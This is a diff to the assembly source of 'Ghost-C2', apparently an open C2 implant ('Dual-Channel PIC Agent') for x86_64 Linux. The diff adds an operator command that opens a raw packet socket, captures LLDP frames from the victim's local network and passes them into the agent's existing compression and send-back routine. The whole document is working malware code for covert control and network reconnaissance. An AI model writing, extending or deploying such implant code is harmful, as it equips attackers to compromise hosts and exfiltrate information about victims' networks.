@@ -10,7 +10,7 @@ BITS 64
 ;     \|_______|\|__|\|__|\|_______|\_________\   \|__|       \|______\|_________|
 ;                                  \|_________|                                   
 ; ===================================================================================
-; Project      : Ghost-C2 (v3.6.3) - "The Hybrid Phantom (Dual-Channel PIC Agent)"
+; Project      : Ghost-C2 (v3.6.3-1) - "The Hybrid Phantom (Dual-Channel PIC Agent)"
 ; Author       : JM00NJ (https://github.com/JM00NJ) / https://netacoding.com/
 ; Architecture : x86_64 Linux (Pure Assembly, Libc-free, 100% PIC)
 ; -----------------------------------------------------------------------------------
@@ -133,6 +133,9 @@ _sniff:
     cmp byte [rsi +1], 'I'
     je _switch_to_icmp
     
+    cmp byte [rsi + 1], 'L'
+    je _network_map
+    
     ; --- [MIMICRY UPDATE] DECRYPTION & OFFSET HANDLING ---
     mov [rbp + 0x1200 + 16], rsi
 	mov rdx, r14                     
@@ -185,6 +188,7 @@ _read_done:
     ;call _xor_cipher                
     mov rax, 3                      ; sys_close (Close memfd)
     syscall
+_compress_and_send:
     ; --- COMPRESSION CALL ---
     lea rsi, [rbp + 0x4000]     ; SOURCE: Raw output
     lea rdi, [rbp + 0x100000]   ; DEST: Compressed buffer
@@ -919,6 +923,80 @@ _switch_to_icmp:
     ; 4. No ICMP beacon just sniffing directly / ICMP Beacon atmaz! Direkt pusuya (sniff) yatar.
 
     jmp _sniff
+
+_network_map:
+    ; AF_PACKET socket for LLDP
+    mov rax, 40
+    add rax, 1              ; sys_socket = 41
+    mov rdi, 17             ; AF_PACKET
+    mov rsi, 3              ; SOCK_RAW
+    mov rdx, 0xCC88         ; htons(ETH_P_LLDP)
+    syscall
+    mov [rbp + 0x3048], rax ; lldp_fd
+	
+	; sockaddr_ll yapısı rbp+0x3060'a kur
+    mov word  [rbp + 0x3060],      17      ; sll_family = AF_PACKET
+    mov word  [rbp + 0x3062],      0xCC88  ; sll_protocol = htons(ETH_P_LLDP)
+    mov dword [rbp + 0x3064],      2       ; sll_ifindex = 2 (enp0s3)
+    mov word  [rbp + 0x3068],      0       ; sll_hatype
+    mov byte  [rbp + 0x306A],      0       ; sll_pkttype
+    mov byte  [rbp + 0x306B],      0       ; sll_halen
+
+    ; bind
+    mov rax, 49             ; sys_bind
+    mov edi, dword [rbp + 0x3048]
+    lea rsi, [rbp + 0x3060]
+    mov rdx, 20             ; sizeof(sockaddr_ll)
+    syscall
+
+    ; timeout 60sn yap (30sn race condition var)
+    mov qword [rbp + 0x3050], 60
+    mov qword [rbp + 0x3058], 0
+    mov rax, 54             ; sys_setsockopt
+    mov edi, dword [rbp + 0x3048]
+    mov rsi, 1              ; SOL_SOCKET
+    mov rdx, 20             ; SO_RCVTIMEO
+    lea r10, [rbp + 0x3050]
+    mov r8, 16
+    syscall
+
+
+    ; toplama loop
+    xor r14, r14
+	xor r15, r15
+	
+.lldp_loop:
+    mov rax, 45             ; sys_recvfrom
+    mov edi, dword [rbp + 0x3048]
+    lea rsi, [rbp + 0x4000 + r14]
+    mov rdx, 1500           ; max ethernet frame
+    xor r10, r10
+    xor r8, r8
+    xor r9, r9
+    syscall
+
+    test rax, rax
+    jle .lldp_done          ; timeout veya hata → bitir
+    add r14, rax
+    inc r15
+    cmp r15, 5
+    jge .lldp_done
+    cmp r14, 5242880
+    jl .lldp_loop
+
+.lldp_done:
+    ; socket kapat
+    mov rax, 3
+    mov edi, dword [rbp + 0x3048]
+    syscall
+	
+	test r14, r14
+	jz _sniff
+
+	xor r15, r15
+    ; doğrudan compress+send pipeline'ına at
+    ; r14 = toplanan byte sayısı, rbp+0x4000 = ham data
+    jmp _compress_and_send
 
 _exit:
     mov rax, 60                     ; sys_exit
